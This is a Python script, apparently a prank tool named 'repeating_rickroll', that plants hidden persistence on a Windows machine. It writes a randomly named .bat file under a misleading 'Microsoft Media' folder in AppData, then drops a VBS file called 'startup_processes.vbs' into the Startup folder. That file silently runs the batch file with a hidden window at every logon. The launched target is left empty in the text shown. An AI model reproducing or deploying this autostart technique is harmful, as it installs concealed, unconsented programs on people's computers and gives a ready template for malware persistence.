def repeating_rickroll(bat_file_path):
    import platform as pf
    import getpass as gp
    import os

    def get_user():
        try:
            ret = gp.getuser()
        except:
            try:
                if pf.system() == 'Darwin':
                    temp_list = os.getcwd().split('/')
                elif pf.system() == 'Windows':
                    temp_list = os.getcwd().split('\\')
                ret = temp_list [temp_list.index('Users') + 1]
            except:
                try:
                    if pf.system() == 'Darwin':
                        temp_list = __file__.split('/')
                    elif pf.system() == 'Windows':
                        temp_list = __file__.split('\\')
                    ret = temp_list [temp_list.index('Users') + 1]
                except:
                    ret = 'Unable to determine'
        return ret

    # Makes path if they dont exist
    if not os.path.exists( os.path.dirname(bat_file_path) ):
        os.makedirs( os.path.dirname(bat_file_path) )
    
    vbs_file_path = f'C:\\Users\\{get_user()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup_processes.vbs'

    # Makes the .bat file
    with open(bat_file_path, 'w') as bat_file:
        bat_file.write('start "" ""')
    # Makes the .vbs file
    with open(vbs_file_path, 'w') as vbs_file:
        vbs_file.write(f'Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run chr(34) & "{bat_file_path}" & Chr(34), 0\nSet WshShell = Nothing')



if __name__ == "__main__":
    import platform as pf
    import getpass as gp
    import random as r
    import os

    def get_user():
        try:
            ret = gp.getuser()
        except:
            try:
                if pf.system() == 'Darwin':
                    temp_list = os.getcwd().split('/')
                elif pf.system() == 'Windows':
                    temp_list = os.getcwd().split('\\')
                ret = temp_list [temp_list.index('Users') + 1]
            except:
                try:
                    if pf.system() == 'Darwin':
                        temp_list = __file__.split('/')
                    elif pf.system() == 'Windows':
                        temp_list = __file__.split('\\')
                    ret = temp_list [temp_list.index('Users') + 1]
                except:
                    ret = 'Unable to determine'
        return ret

    def rand_string(chars):
        import random as r
        lib = 'qwertyuiopasdfghjklzxcvbnm'
        ret = ''
        for _ in range(chars):
            rand_chr = lib[r.randint( 0, len(lib)-1 )]
            ret += rand_chr
        return ret

    bat_file_path = f'C:\\Users\\{get_user()}\\AppData\\Local\\Microsoft Media\\{rand_string(12)}.bat'

    repeating_rickroll(bat_file_path)
